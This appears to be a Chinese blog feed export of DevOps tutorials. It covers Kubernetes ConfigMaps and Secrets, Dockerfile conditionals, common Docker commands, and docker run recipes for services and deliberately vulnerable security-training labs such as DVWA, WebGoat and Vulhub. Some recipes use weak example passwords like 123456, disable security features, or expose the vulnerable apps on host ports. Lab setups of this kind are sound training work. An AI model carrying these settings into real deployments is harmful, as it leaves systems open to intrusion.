<td>后端协议 HTTP&#x2F;HTTPS</td>
</tr>
<tr>
<td>nginx.ingress.kubernetes.io&#x2F;whitelist-source-range</td>
<td>限制来源 IP</td>
</tr>
<tr>
<td>nginx.ingress.kubernetes.io&#x2F;configuration-snippet</td>
<td>插入 NGINX 配置片段</td>
</tr>
<tr>
<td>例如，限制某服务只能由特定 IP 段访问：</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">annotations:</span></span><br><span class="line">  <span class="attr">nginx.ingress.kubernetes.io/whitelist-source-range:</span> <span class="string">&quot;192.168.0.0/24&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes配置详解二【ConfigMap与Secret讲解】</title>
    <url>/cnblogs.github.io/p/6ae7.html</url>
    <content><![CDATA[<h3 id="ConfigMap：管理普通配置信息"><a href="#ConfigMap：管理普通配置信息" class="headerlink" title="ConfigMap：管理普通配置信息"></a>ConfigMap：管理普通配置信息</h3><p>ConfigMap 用于存储非敏感的配置信息，如：</p>
<ul>
<li>应用的参数设置</li>
<li>环境变量配置</li>
<li>配置文件内容</li>
</ul>
<h3 id="创建-ConfigMap-的三种方式："><a href="#创建-ConfigMap-的三种方式：" class="headerlink" title="创建 ConfigMap 的三种方式："></a>创建 ConfigMap 的三种方式：</h3><h4 id="1-从文件创建"><a href="#1-从文件创建" class="headerlink" title="1. 从文件创建"></a>1. 从文件创建</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create configmap app-config --from-file=./app.properties</span><br></pre></td></tr></table></figure>
<h4 id="2-从字面值创建"><a href="#2-从字面值创建" class="headerlink" title="2. 从字面值创建"></a>2. 从字面值创建</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create configmap app-config --from-literal=ENV=prod --from-literal=VERSION=1.2.3</span><br></pre></td></tr></table></figure>
<h4 id="3-使用-YAML-配置"><a href="#3-使用-YAML-配置" class="headerlink" title="3. 使用 YAML 配置"></a>3. 使用 YAML 配置</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">app-config</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">ENV:</span> <span class="string">&quot;prod&quot;</span></span><br><span class="line">  <span class="attr">VERSION:</span> <span class="string">&quot;1.2.3&quot;</span></span><br><span class="line">  <span class="attr">config.yaml:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    port: 8080</span></span><br><span class="line"><span class="string">    logLevel: info</span></span><br></pre></td></tr></table></figure>

<h3 id="使用-ConfigMap-的四种方式"><a href="#使用-ConfigMap-的四种方式" class="headerlink" title="使用 ConfigMap 的四种方式"></a>使用 ConfigMap 的四种方式</h3><h4 id="1-注入为环境变量"><a href="#1-注入为环境变量" class="headerlink" title="1. 注入为环境变量"></a>1. 注入为环境变量</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">envFrom:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">configMapRef:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">app-config</span></span><br></pre></td></tr></table></figure>
<h4 id="2-注入为单个变量"><a href="#2-注入为单个变量" class="headerlink" title="2. 注入为单个变量"></a>2. 注入为单个变量</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">APP_ENV</span></span><br><span class="line">    <span class="attr">valueFrom:</span></span><br><span class="line">      <span class="attr">configMapKeyRef:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">app-config</span></span><br><span class="line">        <span class="attr">key:</span> <span class="string">ENV</span></span><br></pre></td></tr></table></figure>
<h4 id="3-挂载为文件（适合配置文件）"><a href="#3-挂载为文件（适合配置文件）" class="headerlink" title="3. 挂载为文件（适合配置文件）"></a>3. 挂载为文件（适合配置文件）</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumeMounts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config-volume</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/etc/config</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">config-volume</span></span><br><span class="line">    <span class="attr">configMap:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">app-config</span></span><br></pre></td></tr></table></figure>

<h3 id="Secret：管理敏感配置信息"><a href="#Secret：管理敏感配置信息" class="headerlink" title="Secret：管理敏感配置信息"></a>Secret：管理敏感配置信息</h3><p>Secret 用于存储敏感信息，如：</p>
<ul>
<li>数据库账号密码</li>
<li>JWT 签名密钥</li>
<li>TLS 证书与私钥</li>
</ul>
<h3 id="创建-Secret-的三种方式："><a href="#创建-Secret-的三种方式：" class="headerlink" title="创建 Secret 的三种方式："></a>创建 Secret 的三种方式：</h3><h4 id="1-从字面值（需-base64-编码）"><a href="#1-从字面值（需-base64-编码）" class="headerlink" title="1. 从字面值（需 base64 编码）"></a>1. 从字面值（需 base64 编码）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create secret generic db-secret --from-literal=username=admin --from-literal=password=123456</span><br></pre></td></tr></table></figure>
<h4 id="2-使用-YAML-编写（注意-base64-编码）"><a href="#2-使用-YAML-编写（注意-base64-编码）" class="headerlink" title="2. 使用 YAML 编写（注意 base64 编码）"></a>2. 使用 YAML 编写（注意 base64 编码）</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">db-secret</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">YWRtaW4=</span>      <span class="comment"># admin</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">MTIzNDU2</span>      <span class="comment"># 123456</span></span><br></pre></td></tr></table></figure>
<h4 id="3-TLS-类型-Secret（自动编码）"><a href="#3-TLS-类型-Secret（自动编码）" class="headerlink" title="3. TLS 类型 Secret（自动编码）"></a>3. TLS 类型 Secret（自动编码）</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl create secret tls tls-secret --cert=./tls.crt --key=./tls.key</span><br></pre></td></tr></table></figure>

<h3 id="使用-Secret-的三种方式"><a href="#使用-Secret-的三种方式" class="headerlink" title="使用 Secret 的三种方式"></a>使用 Secret 的三种方式</h3><h4 id="1-注入为环境变量-1"><a href="#1-注入为环境变量-1" class="headerlink" title="1. 注入为环境变量"></a>1. 注入为环境变量</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">DB_USER</span></span><br><span class="line">    <span class="attr">valueFrom:</span></span><br><span class="line">      <span class="attr">secretKeyRef:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">db-secret</span></span><br><span class="line">        <span class="attr">key:</span> <span class="string">username</span></span><br></pre></td></tr></table></figure>
<h4 id="2-挂载为文件"><a href="#2-挂载为文件" class="headerlink" title="2. 挂载为文件"></a>2. 挂载为文件</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">volumeMounts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">secret-volume</span></span><br><span class="line">    <span class="attr">mountPath:</span> <span class="string">/etc/secret</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">secret-volume</span></span><br><span class="line">    <span class="attr">secret:</span></span><br><span class="line">      <span class="attr">secretName:</span> <span class="string">db-secret</span></span><br></pre></td></tr></table></figure>

<p><strong>ConfigMap vs Secret 核心对比</strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>ConfigMap</th>
<th>Secret</th>
</tr>
</thead>
<tbody><tr>
<td>存储类型</td>
<td>明文</td>
<td>base64 编码（并非加密）</td>
</tr>
<tr>
<td>用途</td>
<td>一般配置信息</td>
<td>敏感信息（密码、证书）</td>
</tr>
<tr>
<td>挂载方式</td>
<td>环境变量、文件</td>
<td>环境变量、文件</td>
</tr>
<tr>
<td>加密支持</td>
<td>❌ 默认无加密</td>
<td>✅ 可结合加密机制（如 KMS）</td>
</tr>
<tr>
<td>安全性</td>
<td>低</td>
<td>高（但仍建议配合 RBAC）</td>
</tr>
</tbody></table>
<h3 id="实战案例：配置数据库连接信息"><a href="#实战案例：配置数据库连接信息" class="headerlink" title="实战案例：配置数据库连接信息"></a>实战案例：配置数据库连接信息</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Secret</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">db-secret</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">Opaque</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">YWRtaW4=</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">MTIzNDU2</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">app</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">app</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">app</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">my-app:v1</span></span><br><span class="line">          <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">DB_USER</span></span><br><span class="line">              <span class="attr">valueFrom:</span></span><br><span class="line">                <span class="attr">secretKeyRef:</span></span><br><span class="line">                  <span class="attr">name:</span> <span class="string">db-secret</span></span><br><span class="line">                  <span class="attr">key:</span> <span class="string">username</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">DB_PASS</span></span><br><span class="line">              <span class="attr">valueFrom:</span></span><br><span class="line">                <span class="attr">secretKeyRef:</span></span><br><span class="line">                  <span class="attr">name:</span> <span class="string">db-secret</span></span><br><span class="line">                  <span class="attr">key:</span> <span class="string">password</span></span><br></pre></td></tr></table></figure>

<h3 id="Secret-的安全最佳实践"><a href="#Secret-的安全最佳实践" class="headerlink" title="Secret 的安全最佳实践"></a>Secret 的安全最佳实践</h3><p>✅ 开启 Kubernetes API Server 的加密存储（EncryptionConfiguration）<br>✅ 使用 RBAC 限制访问 Secret 的权限<br>✅ 定期轮换密钥与 Secret<br>✅ 使用 External Secrets 工具（如 External Secrets Operator）接入云上密钥管理系统（AWS Secrets Manager、Vault 等）</p>
<p><strong>总结：ConfigMap 与 Secret 不是选一个，而是一起用！</strong><br>✅ 配置文件统一管理？用 ConfigMap<br>✅ 数据库密码传入？用 Secret<br>✅ 不想改代码就能换配置？挂载 + 环境变量是关键<br>✅ 想安全地管理密钥？配合 RBAC + 加密 + 密钥轮换</p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile指令详解案例一【条件表达式】</title>
    <url>/cnblogs.github.io/p/36645.html</url>
    <content><![CDATA[<h4 id="类似if-else"><a href="#类似if-else" class="headerlink" title="类似if-else"></a>类似if-else</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Use an Ubuntu base image</span><br><span class="line">FROM ubuntu:20.04</span><br><span class="line"></span><br><span class="line"># Avoid prompts with apt</span><br><span class="line">ENV DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"># Declare an argument for the web server</span><br><span class="line">ARG WEBSERVER</span><br><span class="line"></span><br><span class="line"># Use shell logic to determine which server to install</span><br><span class="line">RUN if [ &quot;$WEBSERVER&quot; = &quot;nginx&quot; ]; then \</span><br><span class="line">        apt-get update &amp;&amp; apt-get install -y nginx; \</span><br><span class="line">    elif [ &quot;$WEBSERVER&quot; = &quot;apache&quot; ]; then \</span><br><span class="line">        apt-get update &amp;&amp; apt-get install -y apache2; \</span><br><span class="line">    else \</span><br><span class="line">        echo &quot;No valid webserver specified&quot;; \</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line"># Rest of the Dockerfile... </span><br></pre></td></tr></table></figure>
<p>构建镜像并指定 web 服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build --build-arg WEBSERVER=nginx -t myimage:latest .</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker总结一【常用命令】</title>
    <url>/cnblogs.github.io/p/22669.html</url>
    <content><![CDATA[<h4 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h4><h5 id="镜像（Image）相关命令"><a href="#镜像（Image）相关命令" class="headerlink" title="镜像（Image）相关命令"></a>镜像（Image）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images                                                    # 查看本地所有镜像</span><br><span class="line">docker search &lt;镜像名&gt;                                            # 从 Docker Hub 搜索镜像（如 docker search nginx）</span><br><span class="line">docker pull &lt;镜像名:标签&gt;                                         #  拉取镜像（如 docker pull nginx:latest）</span><br><span class="line">docker rmi &lt;镜像ID或名称&gt;                                         # 删除本地镜像（-f 强制删除）</span><br><span class="line">docker build -t &lt;镜像名&gt; .                                        # 根据当前目录的 Dockerfile 构建镜像</span><br><span class="line">docker save -o &lt;文件名&gt;.tar &lt;镜像名&gt;                               # 将镜像保存为 .tar 文件（备份）</span><br><span class="line">docker load -i &lt;文件名&gt;.tar                                       # 从 .tar 文件加载镜像</span><br></pre></td></tr></table></figure>
<h5 id="容器（Container）相关命令"><a href="#容器（Container）相关命令" class="headerlink" title="容器（Container）相关命令"></a>容器（Container）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps                                                       # 查看运行中的容器</span><br><span class="line">docker ps -a                                                    # 查看所有容器（包括已停止的）</span><br><span class="line">docker run -d -p &lt;主机端口&gt;:&lt;容器端口&gt; --name &lt;容器名&gt; &lt;镜像名&gt;    # 启动容器（-d 后台运行，-p 端口映射）</span><br><span class="line">docker start/stop/restart &lt;容器名或ID&gt;                          # 启动/停止/重启容器</span><br><span class="line">docker rm &lt;容器名或ID&gt;                                          # 删除已停止的容器（-f 强制删除运行中的容器）</span><br><span class="line">docker exec -it &lt;容器名或ID&gt; /bin/bash                          # 进入运行中的容器（交互式终端）</span><br><span class="line">docker logs &lt;容器名或ID&gt;                                        # 查看容器日志（-f 实时跟踪）</span><br></pre></td></tr></table></figure>
<h5 id="网络（Network）相关命令"><a href="#网络（Network）相关命令" class="headerlink" title="网络（Network）相关命令"></a>网络（Network）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker network ls                                               # 查看所有网络</span><br><span class="line">docker network create &lt;网络名&gt;                                  # 创建自定义网络</span><br><span class="line">docker network inspect &lt;网络名&gt;                                 # 查看网络详情</span><br><span class="line">docker network connect &lt;网络名&gt; &lt;容器名&gt;                         # 将容器连接到指定网络</span><br></pre></td></tr></table></figure>
<h5 id="数据卷（Volume）相关命令"><a href="#数据卷（Volume）相关命令" class="headerlink" title="数据卷（Volume）相关命令"></a>数据卷（Volume）相关命令</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker volume ls                                                # 查看所有数据卷</span><br><span class="line">docker volume create &lt;卷名&gt;                                      # 创建数据卷</span><br><span class="line">docker volume inspect &lt;卷名&gt;                                     # 查看数据卷详情</span><br><span class="line">docker run -v &lt;主机路径&gt;:&lt;容器路径&gt; &lt;镜像名&gt;                       # 挂载主机目录到容器</span><br><span class="line">docker run -v &lt;卷名&gt;:&lt;容器路径&gt; &lt;镜像名&gt;                           # 使用数据卷挂载</span><br></pre></td></tr></table></figure>
<h5 id="清理与维护"><a href="#清理与维护" class="headerlink" title="清理与维护"></a>清理与维护</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker system df                                                # 查看 Docker 磁盘使用情况</span><br><span class="line">docker system prune                                             # 清理无用镜像、容器、网络（-a 包含未使用的镜像）</span><br><span class="line">docker container prune                                          # 删除所有已停止的容器</span><br><span class="line">docker image prune                                              # 删除未被使用的镜像</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker总结三【单机版安装】</title>
    <url>/cnblogs.github.io/p/30703.html</url>
    <content><![CDATA[<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull mysql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行容器</span></span><br><span class="line">docker run -d -e MYSQL_ROOT_PASSWORD=123456 --name=mymysql -p 3307:3306 mysql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入mysql容器</span></span><br><span class="line">docker exec -it mysql sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录mysql</span></span><br><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure>

<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行容器</span></span><br><span class="line">docker run -d --name mynginx -p 81:80 nginx</span><br></pre></td></tr></table></figure>

<h3 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull gitlab/gitlab-ce</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建gitlab环境变量</span></span><br><span class="line">export GITLAB_HOME=/home/gitlab</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行容器</span></span><br><span class="line">docker run -d --name=gitlab -u root --restart=always -v $GITLAB_HOME/config:/etc/gitlab -v $GITLAB_HOME/logs:/var/log/gitlab -v $GITLAB_HOME/data:/var/opt/gitlab -p 443:443 -p 8081:80 -p 2222:22 gitlab/gitlab-ce</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">初始化配置</span></span><br><span class="line">docker exec -it gitlab bash</span><br><span class="line">cat /etc/gitlab/initial_root_password</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改配置文件</span></span><br><span class="line">docker exec -it gitlab vim /etc/gitlab/gitlab.rb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加或修改以下内容</span></span><br><span class="line">external_url &#x27;http://your_server_ip:80&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果使用非标准SSH端口</span></span><br><span class="line">gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;] = 2222</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">应用配置并重启</span></span><br><span class="line">docker exec -it gitlab gitlab-ctl reconfigure</span><br><span class="line">docker exec -it gitlab gitlab-ctl restart</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong> 用户名为 root</p>
<h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull jenkins</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行容器</span></span><br><span class="line">docker run -d --name=jenkins -v /home/jenkins:/var/jenkins_home -p 8088:8080 -u root --restart=always jenkins</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>首次访问需输入密码，宿主机上密码文件路径为 &#x2F;home&#x2F;jenkins&#x2F;secrets&#x2F;initialAdminPassword，或是进入容器内查看：&#x2F;var&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword</p>
<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull rabbitmq:3.7-management</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动容器</span></span><br><span class="line">docker run --name=rabbitmq -d --restart always -p 15672:15672 -p 5672:5672 -v /home/rabbitmq:/var/lib/rabbitmq rabbitmq:3.7-management</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>如果docker pull rabbitmq后面不带management，启动rabbitmq后是无法打开管理界面的，所以我们需要下载带management插件的rabbitmq。登录账号和密码都是：guest</p>
<h3 id="It-tools"><a href="#It-tools" class="headerlink" title="It-tools"></a>It-tools</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># it-tools</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># https://github.com/CorentinTh/it-tools</span></span></span><br><span class="line">sudo docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest</span><br></pre></td></tr></table></figure>

<h3 id="Sqlserver"><a href="#Sqlserver" class="headerlink" title="Sqlserver"></a>Sqlserver</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># sqlserver镜像拉取</span></span></span><br><span class="line">sudo docker pull mcr.microsoft.com/mssql/server:2022-latest</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -e &quot;ACCEPT_EULA=Y&quot; -e &quot;MSSQL_SA_PASSWORD=&lt;Q1w2e3r4&gt;&quot; -p 1433:1433 --name sql_server -d mcr.microsoft.com/mssql/server:2022-latest</span><br></pre></td></tr></table></figure>

<h3 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建持久化数据卷</span></span><br><span class="line">docker volume create gvm-data</span><br><span class="line">docker volume create gvm-config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull securecompliance/gvm:latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建并运行容器</span></span><br><span class="line">docker run -d --name openvas-gvm --cap-add=NET_ADMIN --security-opt seccomp=unconfined -p 9392:9392 -e PASSWORD=&quot;YourStrongPass123!&quot; -v gvm-data:/data --restart unless-stopped securecompliance/gvm:latest</span><br></pre></td></tr></table></figure>
<p>进入 OpenVAS 登录页面，使用默认的admin用户名和密码YourStrongPass123!登录</p>
<h3 id="Vulhub"><a href="#Vulhub" class="headerlink" title="Vulhub"></a>Vulhub</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Vulhub官方仓库下载靶场环境</span></span><br><span class="line">git clone --depth 1 https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入任何一个漏洞目录</span></span><br><span class="line">cd vulhub/spring/CVE-2022-22947</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动环境</span></span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="Webgoat"><a href="#Webgoat" class="headerlink" title="Webgoat"></a>Webgoat</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># webgoat镜像拉取</span></span></span><br><span class="line">sudo docker pull webgoat/webgoat-8.0</span><br><span class="line">sudo docker pull webgoat/webwolf</span><br><span class="line">sudo docker pull webgoat/goatandwolf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name webgoat -p 30007:8888 -p 30001:8080 -p 30008:9090 webgoat/goatandwolf</span><br></pre></td></tr></table></figure>

<h3 id="Upload-lab"><a href="#Upload-lab" class="headerlink" title="Upload-lab"></a>Upload-lab</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># upload-labs镜像拉取</span></span></span><br><span class="line">docker pull cuer/upload-labs</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name upload-labs -p 30002:80 cuer/upload-labs</span><br></pre></td></tr></table></figure>

<h3 id="Sqli-labs"><a href="#Sqli-labs" class="headerlink" title="Sqli-labs"></a>Sqli-labs</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># sqli-labs镜像拉取</span></span></span><br><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name sqli-labs -p 30003:80 -p 13306:3306 acgpiano/sqli-labs</span><br></pre></td></tr></table></figure>

<h3 id="Pikachu"><a href="#Pikachu" class="headerlink" title="Pikachu"></a>Pikachu</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># pikachu镜像拉取</span></span></span><br><span class="line">docker pull area39/pikachu</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name pikachu -p 30004:80 area39/pikachu</span><br></pre></td></tr></table></figure>

<h3 id="Dwa"><a href="#Dwa" class="headerlink" title="Dwa"></a>Dwa</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># dvwa镜像拉取</span></span></span><br><span class="line">docker pull sagikazarmark/dvwa</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name dvwa -p 30005:80 sagikazarmark/dvwa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者</span></span><br><span class="line">docker pull vulnerables/web-dvwa</span><br><span class="line">docker run -d -p 80:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>

<h3 id="Xss-challenge-tour"><a href="#Xss-challenge-tour" class="headerlink" title="Xss-challenge-tour"></a>Xss-challenge-tour</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># xss-challenge-tour镜像拉取</span></span></span><br><span class="line">docker pull c0ny1/xss-challenge-tour </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动</span></span></span><br><span class="line">sudo docker run -dt --name xss -p 30006:80 c0ny1/xss-challenge-tour</span><br></pre></td></tr></table></figure>

<h3 id="Stirling-PDF"><a href="#Stirling-PDF" class="headerlink" title="Stirling-PDF"></a>Stirling-PDF</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull   frooodle/s-pdf:latest</span><br><span class="line"></span><br><span class="line">docker run -d \</span><br><span class="line">-p 8380:8080 \</span><br><span class="line">-v /data/stirling-pdf/data/:/usr/share/tesseract-ocr/4.00/tessdata \</span><br><span class="line">-v /data/stirling-pdf/configs/:configs \</span><br><span class="line">-e DOCKER_ENABLE_SECURITY=false \</span><br><span class="line">--name stirling-pdf \</span><br><span class="line">frooodle/s-pdf:latest</span><br></pre></td></tr></table></figure>

